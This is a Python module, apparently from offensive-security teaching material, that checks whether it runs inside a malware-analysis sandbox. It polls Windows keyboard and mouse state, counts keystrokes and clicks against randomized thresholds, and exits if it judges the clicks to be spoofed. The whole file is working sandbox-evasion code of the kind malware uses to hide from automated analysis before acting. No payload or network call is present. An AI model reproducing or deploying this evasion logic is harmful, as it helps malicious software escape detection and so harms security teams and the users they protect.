'''
This is used to detect if the program is running under a sandbox.
'''
from ctypes import byref, c_uint, c_ulong, sizeof, Structure, windll
import random
import sys
import time
import win32api

class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_ulong)
    ]

def get_last_input():
    struct_lastinputinfo = LASTINPUTINFO()
    struct_lastinputinfo.cbSize = sizeof(LASTINPUTINFO)

    windll.user32.GetLastInputInfo(byref(struct_lastinputinfo))
    run_time = windll.kernel32.GetTickCount()
    elapsed = run_time - struct_lastinputinfo.dwTime

    print(f"[@] It's been {elapsed} milliseconds since the last event.")
    return elapsed

class Detector:
    def __init__(self):
        self.double_clicks = 0
        self.keystrokes = 0
        self.mouse_clicks = 0

    def get_key_press(self):
        for i in range(0, 0xff):
            state = win32api.GetAsyncKeyState(i)
            if state & 0x0001:
                if i == 0x1:
                    self.mouse_clicks += 1
                    return time.time()
                elif i > 32 and i < 127:
                    self.keystrokes += 1
        return None

    def detect(self):
        previous_timestamp = None
        first_double_click = None
        double_click_threshold = 0.5  # Allow threshold range of time between clicks

        max_double_clicks = 15  # Max allowed double clicks
        max_keystrokes = random.randint(10, 50)  # Keystrokes range
        max_mouse_clicks = random.randint(5, 40)  # Mouse clicks range

       # the amount of time before we judge a user has gone afk
#        max_input_threshold = 30  # Increased to 30 seconds
#        last_input = get_last_input()
#        if last_input >= max_input_threshold:
#            print('User is inactive now')
            # sys.exit()

        detection_complete = False
        while not detection_complete:
            keypress_time = self.get_key_press()
            if keypress_time is not None and previous_timestamp is not None:
                elapsed = keypress_time - previous_timestamp

                # this will detect is a user is trying to spam click to fake inputs to avoid sand box detection
                if elapsed <= double_click_threshold:
                    self.mouse_clicks -= 2
                    self.double_clicks += 1
                    if first_double_click is None:
                        first_double_click = time.time()
                    else:
                        if self.double_clicks >= max_double_clicks:
                            if (keypress_time - first_double_click) <= (max_double_clicks*double_click_threshold):
                                print("[@] User is spoofing mouse clicks")
                                print("[@] Exiting...")
                                sys.exit()

                if (self.keystrokes >= max_keystrokes and
                    self.double_clicks >= max_double_clicks and
                    self.mouse_clicks >= max_mouse_clicks):
                    detection_complete = True

            if keypress_time is not None:
                previous_timestamp = keypress_time

def run():
    d = Detector()
    d.detect()
